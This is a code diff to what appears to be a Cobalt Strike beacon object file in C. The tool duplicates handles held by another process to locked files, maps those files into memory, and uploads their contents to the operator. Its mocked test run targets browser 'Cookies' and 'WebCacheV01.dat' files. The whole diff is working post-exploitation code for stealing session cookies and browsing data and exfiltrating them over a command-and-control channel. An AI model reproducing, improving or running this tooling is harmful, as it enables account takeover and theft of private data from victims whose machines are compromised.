@@ -49,10 +49,11 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
     DFR(KERNEL32, HeapReAlloc);
     DFR(KERNEL32, GetFileType);
     DFR(KERNEL32, HeapFree);
-    DFR(KERNEL32, GlobalAlloc);
-    DFR(KERNEL32, ReadFile);
     DFR(KERNEL32, SetFilePointer);
     DFR(KERNEL32, GetFileSize);
+    DFR(KERNEL32, MapViewOfFile);
+    DFR(KERNEL32, UnmapViewOfFile);
+    DFR(KERNEL32, CreateFileMappingA);
     //MSVCRT DFR
     DFR(MSVCRT, wcstombs)
     DFR(MSVCRT, wcscmp)
@@ -70,10 +71,11 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
     #define GetProcessHeap KERNEL32$GetProcessHeap
     #define HeapReAlloc KERNEL32$HeapReAlloc
     #define HeapFree KERNEL32$HeapFree
-    #define GlobalAlloc KERNEL32$GlobalAlloc
-    #define ReadFile KERNEL32$ReadFile
     #define SetFilePointer KERNEL32$SetFilePointer
     #define GetFileSize KERNEL32$GetFileSize
+    #define MapViewOfFile KERNEL32$MapViewOfFile
+    #define UnmapViewOfFile KERNEL32$UnmapViewOfFile
+    #define CreateFileMappingA KERNEL32$CreateFileMappingA
     //MSVCRT Definitions
     #define wcstombs MSVCRT$wcstombs
     #define wcscmp MSVCRT$wcscmp
@@ -126,7 +128,7 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
         _NtClose NtClose = NULL;
 
         //Obtain handle to process with handle duplication access
-        processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
+        processHandle = OpenProcess(PROCESS_DUP_HANDLE, true, pid);
         if (NULL == processHandle) {
             dwErrorCode = GetLastError();
             BeaconPrintf(CALLBACK_ERROR, "Error: Failed to open process %i, error code %i",pid,dwErrorCode);
@@ -298,14 +300,31 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                     //Get Size of File
                     SetFilePointer(dupHandle, 0, 0, FILE_BEGIN);
                     DWORD dwFileSize = GetFileSize(dupHandle, NULL);
-                    BeaconPrintf(CALLBACK_OUTPUT,"File size is %d\n", dwFileSize);
-                    //Allocate memory for buffer
-                    DWORD dwRead = 0;
-                    CHAR* buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
-                    if (!ReadFile(dupHandle, buffer, dwFileSize, &dwRead, NULL)) {
+                    if (dwFileSize == NULL) {
+                        dwErrorCode = GetLastError();
+                        BeaconPrintf(CALLBACK_ERROR, "Error: Failed to retrieve file size, error code %i", dwErrorCode);
                         continue;
                     }
+                    BeaconPrintf(CALLBACK_OUTPUT,"File size is %d\n", dwFileSize);
 
+                    HANDLE fileMapping = NULL;
+                    LPVOID viewPointer = NULL;
+                    
+                    //Create a file mapping object for the target file using the duplicated handle
+                    fileMapping = CreateFileMappingA(dupHandle, NULL, PAGE_READONLY, 0, 0, NULL);
+                    if (fileMapping == NULL) {
+                        dwErrorCode = GetLastError();
+                        BeaconPrintf(CALLBACK_ERROR, "Error: Failed to create file mapping object for target file in process, error code %i", dwErrorCode);
+                        continue;
+                    }
+                    //Create a mapped view of the target file
+                    viewPointer = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
+                    if (viewPointer == NULL) {
+                        dwErrorCode = GetLastError();
+                        BeaconPrintf(CALLBACK_ERROR, "Error: Failed to map view of target file to memory, error code %i", dwErrorCode);
+                        continue;
+                    }
+                    
                     #ifdef _DEBUG
                     // Construct the full path to the file on the desktop
                     WCHAR filePath[MAX_PATH];
@@ -313,12 +332,12 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                     wcscat(filePath, fileName);
 
                     // Create or open the file for writing
-                    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                    HANDLE hFile = CreateFileW(filePath, 0x80000000 | 0x40000000, 0x00000001 | 0x00000002, NULL, 0x00000002, 0, NULL);
 
                     if (hFile != INVALID_HANDLE_VALUE) {
                         DWORD dwWritten = 0;
                         // Write the contents of the buffer to the file
-                        BOOL writeStatus = WriteFile(hFile, buffer, dwRead, &dwWritten, NULL);
+                        BOOL writeStatus = WriteFile(hFile, viewPointer, dwFileSize, &dwWritten, NULL);
 
                         if (writeStatus) {
                             BeaconPrintf(CALLBACK_OUTPUT, "Downloaded file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
@@ -327,28 +346,35 @@ BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
                         else {
                             BeaconPrintf(CALLBACK_ERROR,"Error: Failed to write data to file. Error code: %ul\n", GetLastError());
                         }
+                        UnmapViewOfFile(viewPointer);
                         NtClose(hFile);
                         hFile = NULL;
                     }
 
                     #else
                     //Convert the wchar_t* string to a multibyte string using wcstombs_s
+                    //This is all to convert the wchar filename to char
                     const size_t bufferSize = wcstombs(NULL, fileName, 0);
                     if (bufferSize < 1) {
                         BeaconPrintf(CALLBACK_ERROR, "Error: Unable to retrieve file size");
                     }
-              
+                    
                     char* fileNameChar = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize+1);  // +1 for null-terminator
                     size_t convertedChars = 0;
                     if (!wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName, bufferSize)) {
                         //Upload file to cobalt strike using method from nanodump
-                        if (upload_file(fileNameChar, buffer, dwFileSize)) {
+                        if (upload_file(fileNameChar, (char *)viewPointer, dwFileSize)) {
                             BeaconPrintf(CALLBACK_OUTPUT, "Downloaded file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
+                        }
+                        else {
+                            BeaconPrintf(CALLBACK_ERROR, "Failed to downlaod file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
                         }
                     }
                     else {
                         BeaconPrintf(CALLBACK_ERROR, "Error: Failed to convert file name to char probably because im not the best coder");
                     }
+                    UnmapViewOfFile(viewPointer);
+                    
                     #endif
                     break;
                 }
@@ -487,7 +513,7 @@ int main(int argc, char* argv[]) {
     // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
     //bof::runMocked<int, wchar_t*, wchar_t*>(go, 6696, L"filename", L"Cookies");
 
-    bof::runMocked<int, wchar_t*, int>(go,6696,L"handle_id",996);
+    bof::runMocked<int, wchar_t*, wchar_t*>(go, 3428, L"filename",L"WebCacheV01.dat");
     return 0;
 }
 
